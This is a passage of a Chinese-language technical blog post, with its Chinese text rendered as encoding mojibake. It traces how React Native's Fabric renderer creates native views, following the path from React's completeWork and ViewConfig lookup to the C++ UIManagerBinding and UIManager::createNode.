        <span class="hljs-title function_">flushSyncWorkAcrossRoots_impl</span>(<span class="hljs-number">0</span>, !<span class="hljs-number">0</span>);         <span class="hljs-comment">// ç«‹å³æ‰§è¡ŒåŒæ­¥å·¥ä½œ</span>
      }
   }
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">flushSyncWorkAcrossRoots_impl</span>(<span class="hljs-params">syncTransitionLanes, onlyLegacy</span>) {
  <span class="hljs-keyword">if</span> (!isFlushingWork &amp;&amp; mightHavePendingSyncWork) {
    isFlushingWork = !<span class="hljs-number">0</span>;
    <span class="hljs-keyword">do</span> {
      <span class="hljs-keyword">var</span> didPerformSomeWork = !<span class="hljs-number">1</span>;
      <span class="hljs-comment">// éå†æ‰€æœ‰æ ¹èŠ‚ç‚¹æ‰§è¡ŒåŒæ­¥å·¥ä½œ</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> root = firstScheduledRoot; <span class="hljs-literal">null</span> !== root; ) {
        <span class="hljs-keyword">if</span> (!onlyLegacy || <span class="hljs-number">0</span> === root.<span class="hljs-property">tag</span>)
          <span class="hljs-comment">//çœç•¥......</span>
          <span class="hljs-comment">// å¸¸è§„åŒæ­¥æ›´æ–° </span>
          <span class="hljs-title function_">performSyncWorkOnRoot</span>(root, <span class="hljs-title class_">JSCompiler</span>_inline_result));

        root = root.<span class="hljs-property">next</span>;
      }
    } <span class="hljs-keyword">while</span> (didPerformSomeWork);
    isFlushingWork = !<span class="hljs-number">1</span>;
  }
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">performSyncWorkOnRoot</span>(<span class="hljs-params">root, lanes</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">flushPendingEffects</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-title function_">performWorkOnRoot</span>(root, lanes, !<span class="hljs-number">0</span>);
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">performWorkOnRoot</span>(<span class="hljs-params">root$jscomp$0, lanes, forceSync</span>) {
   <span class="hljs-comment">// é€‰æ‹©åŒæ­¥æˆ–å¹¶å‘æ¸²æŸ“</span>
   <span class="hljs-keyword">var</span> shouldTimeSlice = (!forceSync &amp;&amp; <span class="hljs-comment">/* æ¡ä»¶åˆ¤æ–­ */</span>);
   <span class="hljs-keyword">var</span> exitStatus = shouldTimeSlice
      ? <span class="hljs-title function_">renderRootConcurrent</span>(root, lanes)            <span class="hljs-comment">// å¹¶å‘æ¸²æŸ“</span>
      : <span class="hljs-title function_">renderRootSync</span>(root, lanes, !<span class="hljs-number">0</span>);             <span class="hljs-comment">// åŒæ­¥æ¸²æŸ“</span>

   <span class="hljs-comment">// çœç•¥......</span>
}
</code></pre>
<p>ç»§ç»­è¿½è¸ªåŒæ­¥æ¸²æŸ“<code>renderRootSync</code>æ–¹æ³•å®ç°ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">renderRootSync</span>(<span class="hljs-params">root, lanes, shouldYieldForPrerendering</span>) {
   <span class="hljs-comment">// çœç•¥......</span>

   <span class="hljs-comment">// åŒæ­¥å·¥ä½œå¾ªç¯</span>
   <span class="hljs-title function_">workLoopSync</span>();
   <span class="hljs-comment">// çœç•¥......</span>
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopSync</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">for</span> (; <span class="hljs-literal">null</span> !== workInProgress; ) <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork</span>) {
  <span class="hljs-comment">// å¤„ç†å•ä¸ªFiberèŠ‚ç‚¹</span>
  <span class="hljs-keyword">var</span> next = <span class="hljs-title function_">beginWork</span>(unitOfWork.<span class="hljs-property">alternate</span>, unitOfWork, entangledRenderLanes);
  unitOfWork.<span class="hljs-property">memoizedProps</span> = unitOfWork.<span class="hljs-property">pendingProps</span>;
  <span class="hljs-literal">null</span> === next ? <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork) : (workInProgress = next);
}


<span class="hljs-keyword">function</span> <span class="hljs-title function_">completeUnitOfWork</span>(<span class="hljs-params">unitOfWork</span>) {
  <span class="hljs-keyword">var</span> completedWork = unitOfWork;
  <span class="hljs-keyword">do</span> {
    <span class="hljs-comment">// çœç•¥......</span>
    unitOfWork = completedWork.<span class="hljs-property">return</span>;
    <span class="hljs-keyword">var</span> next = <span class="hljs-title function_">completeWork</span>(
      completedWork.<span class="hljs-property">alternate</span>,
      completedWork,
      entangledRenderLanes
    );
    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> !== next) {
      workInProgress = next;
      <span class="hljs-keyword">return</span>;
    }
    completedWork = completedWork.<span class="hljs-property">sibling</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> !== completedWork) {
      workInProgress = completedWork;
      <span class="hljs-keyword">return</span>;
    }
    workInProgress = completedWork = unitOfWork;
  } <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> !== completedWork);
  <span class="hljs-number">0</span> === workInProgressRootExitStatus &amp;&amp; (workInProgressRootExitStatus = <span class="hljs-number">5</span>);
}
</code></pre>
<p>æœ€ç»ˆæ˜¯è°ƒç”¨çš„<code>completeWork</code>æ–¹æ³•å®Œæˆæ¸²æŸ“å·¥ä½œï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeWork</span>(<span class="hljs-params">current, workInProgress, renderLanes</span>) {
  <span class="hljs-keyword">var</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;
  <span class="hljs-keyword">switch</span> (workInProgress.<span class="hljs-property">tag</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-number">28</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">bubbleProperties</span>(workInProgress), <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">bubbleProperties</span>(workInProgress), <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
      <span class="hljs-comment">// çœç•¥......</span>
      <span class="hljs-comment">// return  </span>
    <span class="hljs-keyword">case</span> <span class="hljs-number">26</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">27</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
      <span class="hljs-title function_">popHostContext</span>(workInProgress);
      <span class="hljs-keyword">var</span> type = workInProgress.<span class="hljs-property">type</span>;
      <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> !== current &amp;&amp; <span class="hljs-literal">null</span> != workInProgress.<span class="hljs-property">stateNode</span>)
        <span class="hljs-comment">// çœç•¥......</span>
      <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// é¦–æ¬¡æŒ‚è½½</span>
        <span class="hljs-keyword">if</span> (!newProps) {  
          <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> === workInProgress.<span class="hljs-property">stateNode</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-title class_">Error</span>(
              <span class="hljs-string">"We must have new props for new mounts. This error is likely caused by a bug in React. Please file an issue."</span>
            );
          <span class="hljs-title function_">bubbleProperties</span>(workInProgress);
          <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        current = rootInstanceStackCursor.<span class="hljs-property">current</span>;
        renderLanes = nextReactTag;
        nextReactTag += <span class="hljs-number">2</span>;
        <span class="hljs-comment">// è·å–ViewConfig</span>
        type = <span class="hljs-title function_">getViewConfigForType</span>(type);
        <span class="hljs-keyword">var</span> updatePayload = <span class="hljs-title class_">ReactNativePrivateInterface</span>.<span class="hljs-title function_">createAttributePayload</span>(
          newProps,
          type.<span class="hljs-property">validAttributes</span>
        );
        <span class="hljs-comment">// åˆ›å»ºåŸç”ŸèŠ‚ç‚¹</span>
        current = {
          <span class="hljs-attr">node</span>: <span class="hljs-title function_">createNode</span>(
            renderLanes,
            type.<span class="hljs-property">uiViewClassName</span>,  <span class="hljs-comment">//  ä½¿ç”¨ViewConfigä¸­çš„åŸç”Ÿç±»å</span>
            current.<span class="hljs-property">containerTag</span>,
            updatePayload,
            workInProgress
          ),
          <span class="hljs-attr">canonical</span>: {
            <span class="hljs-attr">nativeTag</span>: renderLanes,
            <span class="hljs-attr">viewConfig</span>: type,       <span class="hljs-comment">// ä¿å­˜ViewConfigå¼•ç”¨</span>
            <span class="hljs-attr">currentProps</span>: newProps,
            <span class="hljs-attr">internalInstanceHandle</span>: workInProgress,
            <span class="hljs-attr">publicInstance</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">publicRootInstance</span>: current.<span class="hljs-property">publicInstance</span>
          }
        };
        workInProgress.<span class="hljs-property">flags</span> |= <span class="hljs-number">8</span>;
        <span class="hljs-title function_">appendAllChildren</span>(current, workInProgress, !<span class="hljs-number">1</span>, !<span class="hljs-number">1</span>);
        workInProgress.<span class="hljs-property">stateNode</span> = current;
      }
      <span class="hljs-title function_">bubbleProperties</span>(workInProgress);
      workInProgress.<span class="hljs-property">flags</span> &amp;= -<span class="hljs-number">16777217</span>;
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
  }
}
</code></pre>
<p>æ­¤æ–¹æ³•ä¸­çš„<code>case</code>éƒ½æ˜¯æ•´æ•°ï¼Œä¸ºäº†å¼„æ¸…æ¥šå…¶å«ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹React ä»“åº“ä¸­çš„<strong>Tag</strong>å®šä¹‰ã€‚æºç ä½äº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact%2Fblob%2Fmain%2Fpackages%2Freact-reconciler%2Fsrc%2FReactWorkTags.js" target="_blank" title="https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactWorkTags.js" ref="nofollow noopener noreferrer">ReactWorkTags.js</a>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">FunctionComponent</span> = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ClassComponent</span> = <span class="hljs-number">1</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">HostRoot</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// å®¿ä¸»æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚å®ƒå¯ä»¥åµŒå¥—åœ¨å¦ä¸€ä¸ªèŠ‚ç‚¹å†…éƒ¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">HostPortal</span> = <span class="hljs-number">4</span>; <span class="hljs-comment">// ä¸€ä¸ªå­æ ‘ã€‚å®ƒå¯ä»¥æ˜¯é€šå¾€ä¸åŒæ¸²æŸ“å™¨çš„å…¥å£ç‚¹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">HostComponent</span> = <span class="hljs-number">5</span>;
<span class="hljs-comment">// çœç•¥......</span>
</code></pre>
<p>å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹çš„æ˜¯React Nativeçš„Tagç±»å‹ï¼Œä¹Ÿå°±æ˜¯<code>HostComponent</code>ï¼Œå®ƒçš„å€¼æ˜¯5ï¼Œå› æ­¤å¯¹åº”åˆ°<code>completeWork</code>ä¸­çš„å¤„ç†ä»£ç å°±æ˜¯æˆ‘æˆªå–çš„è¿™éƒ¨åˆ†ã€‚è¿™æ®µä»£ç ä¸­æœ‰ä¸€ä¸ªå…³é”®çš„æ–¹æ³•ï¼Œå°±æ˜¯<code>getViewConfigForType</code>ï¼ŒæŸ¥çœ‹å…¶å®šä¹‰ï¼Œæ˜¾ç¤ºä¸º<code>getViewConfigForType = ReactNativePrivateInterface.ReactNativeViewConfigRegistry.get</code></p>
<p>å¯çœ‹åˆ°ï¼Œè¿™é‡Œå°±å®Œå…¨ä¸å‰é¢<strong>å£°æ˜ç»„ä»¶</strong>ä¸€èŠ‚æœ€ååˆ†æåˆ°çš„<code>ReactNativeViewConfigRegistry.js</code>å¯¹åº”ä¸Šäº†ï¼Œæˆ‘ä»¬å‰é¢åˆ†æçš„æ˜¯ViewConfigçš„æ³¨å†Œï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹<code>get</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * è·å–æŒ‡å®šè§†å›¾çš„é…ç½®ã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨è¯¥è§†å›¾ï¼Œæ­¤é…ç½®å°†ä»UIManagerå»¶è¿ŸåŠ è½½
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">name: string</span>): <span class="hljs-title class_">ViewConfig</span> {
  <span class="hljs-comment">// ä»viewConfigs Mapä¸­æŸ¥æ‰¾å·²ç¼“å­˜çš„ViewConfig</span>
  <span class="hljs-keyword">let</span> viewConfig = viewConfigs.<span class="hljs-title function_">get</span>(name);
  <span class="hljs-keyword">if</span> (viewConfig == <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// è·å–è¯¥ç»„ä»¶çš„é…ç½®ç”Ÿæˆå›è°ƒå‡½æ•°</span>
    <span class="hljs-keyword">const</span> callback = viewConfigCallbacks.<span class="hljs-title function_">get</span>(name);
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-comment">// çœç•¥æ—¥å¿—......</span>
    }
    viewConfig = <span class="hljs-title function_">callback</span>();
    <span class="hljs-title function_">invariant</span>(viewConfig, <span class="hljs-string">'View config not found for component `%s`'</span>, name);

    <span class="hljs-title function_">processEventTypes</span>(viewConfig);
    viewConfigs.<span class="hljs-title function_">set</span>(name, viewConfig);

    <span class="hljs-comment">// é…ç½®è®¾ç½®åæ¸…é™¤å›è°ƒï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šåœ¨æ³¨å†Œè¿‡ç¨‹ä¸­æ©ç›–ä»»ä½•é”™è¯¯ã€‚</span>
    viewConfigCallbacks.<span class="hljs-title function_">set</span>(name, <span class="hljs-literal">null</span>);
  }
  <span class="hljs-keyword">return</span> viewConfig;
}
</code></pre>
<p>é€šè¿‡<strong>ViewConfig</strong>ï¼Œå¯ä»¥å¾—åˆ°<code>uiViewClassName</code>ï¼Œä¹Ÿå°±æ˜¯å£°æ˜çš„ç»„ä»¶åç§°ï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹åŸç”ŸèŠ‚ç‚¹åˆ›å»ºçš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> _nativeFabricUIManage = nativeFabricUIManager,
  createNode = _nativeFabricUIManage.<span class="hljs-property">createNode</span>,          


 <span class="hljs-title function_">createNode</span>(
   renderLanes,
   type.<span class="hljs-property">uiViewClassName</span>,  <span class="hljs-comment">//  ä½¿ç”¨ViewConfigä¸­çš„åŸç”Ÿç±»å</span>
   current.<span class="hljs-property">containerTag</span>,
   updatePayload,
   workInProgress
 )
</code></pre>
<p><code>createNode</code>æ–¹æ³•æ¥è‡ªäºå…¨å±€å¯¹è±¡<code>nativeFabricUIManager</code>ï¼Œé€šè¿‡å˜é‡åå°±çŸ¥é“ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯æ¥è‡ªäºJSIå®šä¹‰çš„å¯¹è±¡ï¼Œä»£ç ä¸åœ¨JSå±‚ã€‚</p>
<h5 data-id="heading-5">C++ å±‚</h5>
<p>ç»§ç»­åœ¨C++ä¸­æœç´¢<code>nativeFabricUIManager</code>ï¼Œå®šä½åˆ°æºç <code>react-native/packages/react-native/ReactCommon/react/renderer/uimanager/UIManagerBinding.cpp</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">void</span> <span class="hljs-title class_">UIManagerBinding</span>::<span class="hljs-title function_">createAndInstallIfNeeded</span>(<span class="hljs-params">
    jsi::Runtime&amp; runtime,
    <span class="hljs-keyword">const</span> std::shared_ptr&lt;UIManager&gt;&amp; uiManager</span>) {
  auto uiManagerModuleName = <span class="hljs-string">"nativeFabricUIManager"</span>;

  auto uiManagerValue =
      runtime.<span class="hljs-title function_">global</span>().<span class="hljs-title function_">getProperty</span>(runtime, uiManagerModuleName);
  <span class="hljs-keyword">if</span> (uiManagerValue.<span class="hljs-title function_">isUndefined</span>()) {
    <span class="hljs-comment">// å…¨å±€å‘½åç©ºé—´ä¸­æ²¡æœ‰è¯¥ç»‘å®šçš„å®ä¾‹ï¼›æˆ‘ä»¬éœ€è¦åˆ›å»ºã€å®‰è£…å¹¶è¿”å›å®ƒ</span>
    auto uiManagerBinding = <span class="hljs-attr">std</span>::make_shared&lt;<span class="hljs-title class_">UIManagerBinding</span>&gt;(uiManager);
    auto object = <span class="hljs-attr">jsi</span>::<span class="hljs-title class_">Object</span>::<span class="hljs-title function_">createFromHostObject</span>(runtime, uiManagerBinding);
    runtime.<span class="hljs-title function_">global</span>().<span class="hljs-title function_">setProperty</span>(
        runtime, uiManagerModuleName, <span class="hljs-attr">std</span>::<span class="hljs-title function_">move</span>(object));
  }
}
</code></pre>
<p>å¯è§è¿™é‡Œçš„<code>nativeFabricUIManager</code>æ˜¯ä¸€ä¸ª<code>jsi::HostObject</code>å¯¹è±¡ï¼Œæˆ‘ä»¬è¦æŸ¥æ‰¾å…¶<code>createNode</code>æ–¹æ³•ï¼Œç›´æ¥æŸ¥çœ‹<strong>UIManagerBinding</strong>çš„<code>get</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">jsi::Value <span class="hljs-title">UIManagerBinding::get</span><span class="hljs-params">(
    jsi::Runtime&amp; runtime,
    <span class="hljs-type">const</span> jsi::PropNameID&amp; name)</span> </span>{
  <span class="hljs-keyword">auto</span> methodName = name.<span class="hljs-built_in">utf8</span>(runtime);

  <span class="hljs-comment">// å°† shared_ptr&lt;UIManager&gt; è½¬æ¢ä¸ºåŸå§‹æŒ‡é’ˆ</span>
  <span class="hljs-comment">// ä¸ºä»€ä¹ˆè¿™æ ·åšï¼ŸåŸå› å¦‚ä¸‹ï¼š</span>
  <span class="hljs-comment">// 1) UIManagerBinding å¼ºå¼•ç”¨ï¼ˆstrongly retainsï¼‰UIManagerã€‚</span>
  <span class="hljs-comment">//    JS VM é€šè¿‡ JSI å¼ºå¼•ç”¨ UIManagerBindingã€‚</span>
  <span class="hljs-comment">//    è¿™äº›å‡½æ•°æ˜¯ JSI å‡½æ•°ï¼Œåªèƒ½é€šè¿‡ JS VM è°ƒç”¨ï¼›å¦‚æœ JS VM è¢«é”€æ¯ï¼Œ</span>
  <span class="hljs-comment">//    è¿™äº›å‡½æ•°æ— æ³•æ‰§è¡Œï¼Œè¿™äº› lambda ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚</span>
  <span class="hljs-comment">// 2) UIManager åªæœ‰åœ¨æ‰€æœ‰å¯¹å®ƒçš„å¼•ç”¨éƒ½è¢«é‡Šæ”¾åæ‰ä¼šè¢«ææ„ï¼ŒåŒ…æ‹¬</span>
  <span class="hljs-comment">//    UIManagerBindingã€‚è¿™åªæœ‰åœ¨ JS VM è¢«ææ„æ—¶æ‰ä¼šå‘ç”Ÿã€‚å› æ­¤ï¼ŒåŸå§‹æŒ‡é’ˆæ˜¯å®‰å…¨çš„ã€‚</span>
  <span class="hljs-comment">//</span>
  <span class="hljs-comment">// å³ä½¿è¿™æ ·åšæ˜¯å®‰å…¨çš„ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ shared_ptr ä½œä¸ºé¢å¤–çš„ä¿é™©å‘¢ï¼Ÿ</span>
  <span class="hljs-comment">// 1) åœ¨ä¸éœ€è¦çš„æƒ…å†µä¸‹ä½¿ç”¨ shared_ptr æˆ– weak_ptr</span>
  <span class="hljs-comment">// æ˜¯ä¸€ç§æ€§èƒ½åŠ£åŒ–ï¼ˆpessimisationï¼‰ã€‚</span>
  <span class="hljs-comment">//    åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒä¼šæ‰§è¡Œæ›´å¤šæŒ‡ä»¤ï¼Œä½†ä¸ä¼šå¸¦æ¥ä»»ä½•é¢å¤–ä»·å€¼ã€‚</span>
  <span class="hljs-comment">// 2) è¿™äº› lambda çš„ç¡®åˆ‡é‡Šæ”¾æ—¶æœºå’Œæ–¹å¼å¾ˆå¤æ‚ã€‚å‘å®ƒä»¬æ·»åŠ  shared_ptr ä¼šå¯¼è‡´</span>
  <span class="hljs-comment">//    UIManager å¯èƒ½å­˜æ´»æ›´é•¿æ—¶é—´ï¼Œè¿™æ˜¯ä¸å¿…è¦çš„ã€å¤æ‚çš„è®¤çŸ¥è´Ÿæ‹…ã€‚</span>
  <span class="hljs-comment">// 3) æœ‰å¼ºçƒˆæ€€ç–‘è®¤ä¸ºï¼Œä»è¿™äº› C++ lambda ä¸­ä¿ç•™ UIManagerï¼ˆè¿™äº› lambda è¢«</span>
  <span class="hljs-comment">//    JSI æŒæœ‰çš„å¯¹è±¡æ‰€ä¿ç•™ï¼‰ï¼Œåœ¨ Scheduler å’Œ JS VM ææ„æ—¶å¯¼è‡´äº†ä¸€äº›å´©æºƒã€‚</span>
  <span class="hljs-comment">//    å¦‚æœ C++ è¯­ä¹‰å¯¼è‡´è¿™äº› lambda åœ¨ JS VM è¢«ææ„åä¸€ä¸ª CPU</span>
  <span class="hljs-comment">//    æ—¶é’Ÿå‘¨æœŸï¼ˆæˆ–æ›´ä¹…ï¼‰ æ‰è¢«é‡Šæ”¾ï¼Œå°±å¯èƒ½å‘ç”Ÿè¿™ç§æƒ…å†µã€‚</span>
  UIManager* uiManager = uiManager_.<span class="hljs-built_in">get</span>();

  <span class="hljs-comment">// Semantic: Creates a new node with given pieces.</span>
  <span class="hljs-keyword">if</span> (methodName == <span class="hljs-string">"createNode"</span>) {
    <span class="hljs-keyword">auto</span> paramCount = <span class="hljs-number">5</span>;
    <span class="hljs-keyword">return</span> jsi::Function::<span class="hljs-built_in">createFromHostFunction</span>(
        runtime,
        name,
        paramCount,
        [uiManager, methodName, paramCount](
            jsi::Runtime&amp; runtime,
            <span class="hljs-type">const</span> jsi::Value&amp; <span class="hljs-comment">/*thisValue*/</span>,
            <span class="hljs-type">const</span> jsi::Value* arguments,
            <span class="hljs-type">size_t</span> count) -&gt; jsi::Value {
          <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">validateArgumentCount</span>(runtime, methodName, paramCount, count);

            <span class="hljs-keyword">auto</span> instanceHandle =
                <span class="hljs-built_in">instanceHandleFromValue</span>(runtime, arguments[<span class="hljs-number">4</span>], arguments[<span class="hljs-number">0</span>]);
            <span class="hljs-keyword">if</span> (!instanceHandle) {
              <span class="hljs-built_in">react_native_assert</span>(<span class="hljs-literal">false</span>);
              <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">undefined</span>();
            }

            <span class="hljs-keyword">return</span> <span class="hljs-built_in">valueFromShadowNode</span>(
                runtime,
                uiManager-&gt;<span class="hljs-built_in">createNode</span>(
                    <span class="hljs-built_in">tagFromValue</span>(arguments[<span class="hljs-number">0</span>]),
                    <span class="hljs-built_in">stringFromValue</span>(runtime, arguments[<span class="hljs-number">1</span>]),
                    <span class="hljs-built_in">surfaceIdFromValue</span>(runtime, arguments[<span class="hljs-number">2</span>]),
                    <span class="hljs-built_in">RawProps</span>(runtime, arguments[<span class="hljs-number">3</span>]),
                    std::<span class="hljs-built_in">move</span>(instanceHandle)),
                <span class="hljs-literal">true</span>);
          } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::logic_error&amp; ex) {
            <span class="hljs-built_in">LOG</span>(FATAL) &lt;&lt; <span class="hljs-string">"logic_error in createNode: "</span> &lt;&lt; ex.<span class="hljs-built_in">what</span>();
          }
        });
  }
  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>

  <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">undefined</span>();
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>react-native/packages/react-native/ReactCommon/react/renderer/uimanager/UIManager.cpp</code>ä¸­çš„<code>createNode</code>å®ç°ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">std::shared_ptr&lt;ShadowNode&gt; <span class="hljs-title">UIManager::createNode</span><span class="hljs-params">(
    Tag tag,                  <span class="hljs-comment">// èŠ‚ç‚¹æ ‡ç­¾</span>
    <span class="hljs-type">const</span> std::string&amp; name,  <span class="hljs-comment">// ç»„ä»¶åç§°</span>
    SurfaceId surfaceId,
    RawProps rawProps,        <span class="hljs-comment">// åŸå§‹å±æ€§</span>
    InstanceHandle::Shared instanceHandle)</span> <span class="hljs-type">const</span> </span>{
  <span class="hljs-function">TraceSection <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-string">"UIManager::createNode"</span>, <span class="hljs-string">"componentName"</span>, name)</span></span>;

  <span class="hljs-comment">// æ ¹æ®ç»„ä»¶åç§°è·å–å¯¹åº”çš„ComponentDescriptor</span>
  <span class="hljs-keyword">auto</span>&amp; componentDescriptor = componentDescriptorRegistry_-&gt;<span class="hljs-built_in">at</span>(name);
  <span class="hljs-keyword">auto</span> fallbackDescriptor =
      componentDescriptorRegistry_-&gt;<span class="hljs-built_in">getFallbackComponentDescriptor</span>();

  PropsParserContext propsParserContext{surfaceId, *contextContainer_};

  <span class="hljs-comment">// åˆ›å»ºShadowNodeFamilyï¼Œç”¨äºç®¡ç†åŒä¸€ç»„ä»¶çš„ä¸åŒå®ä¾‹</span>
  <span class="hljs-keyword">auto</span> family = componentDescriptor.<span class="hljs-built_in">createFamily</span>(
      {.tag = tag,
       .surfaceId = surfaceId,
       .instanceHandle = std::<span class="hljs-built_in">move</span>(instanceHandle)});

  <span class="hljs-comment">// è§£æå’Œå…‹éš†å±æ€§</span>
  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> props = componentDescriptor.<span class="hljs-built_in">cloneProps</span>(
      propsParserContext, <span class="hljs-literal">nullptr</span>, std::<span class="hljs-built_in">move</span>(rawProps));
  <span class="hljs-comment">// åˆ›å»ºåˆå§‹çŠ¶æ€</span>
  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> state = componentDescriptor.<span class="hljs-built_in">createInitialState</span>(props, family);

  <span class="hljs-comment">// åˆ›å»ºShadowNode</span>
  <span class="hljs-keyword">auto</span> shadowNode = componentDescriptor.<span class="hljs-built_in">createShadowNode</span>(
      ShadowNodeFragment{
          .props = fallbackDescriptor != <span class="hljs-literal">nullptr</span> &amp;&amp;
                  fallbackDescriptor-&gt;<span class="hljs-built_in">getComponentHandle</span>() ==
                      componentDescriptor.<span class="hljs-built_in">getComponentHandle</span>()
              ? componentDescriptor.<span class="hljs-built_in">cloneProps</span>(
                    propsParserContext,
                    props,
                    <span class="hljs-built_in">RawProps</span>(folly::dynamic::<span class="hljs-built_in">object</span>(<span class="hljs-string">"name"</span>, name)))
              : props,
          .children = ShadowNodeFragment::<span class="hljs-built_in">childrenPlaceholder</span>(),
          .state = state,
      },
      family);

  <span class="hljs-keyword">if</span> (delegate_ != <span class="hljs-literal">nullptr</span>) {
    delegate_-&gt;<span class="hljs-built_in">uiManagerDidCreateShadowNode</span>(*shadowNode);
  }
  <span class="hljs-keyword">if</span> (leakChecker_) {
    leakChecker_-&gt;<span class="hljs-built_in">uiManagerDidCreateShadowNodeFamily</span>(family);
  }

  <span class="hljs-keyword">return</span> shadowNode;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œé€šè¿‡<code>componentDescriptorRegistry_</code>æ¥æŸ¥æ‰¾Fabric ç»„ä»¶æè¿°å¯¹è±¡ï¼Œè‡³äºæ³¨å†Œçš„åœ°æ–¹ï¼Œä¸‹ä¸€èŠ‚<strong>æ³¨å†Œç»„ä»¶</strong>ä¼šä¸“é—¨åˆ†æã€‚</p>
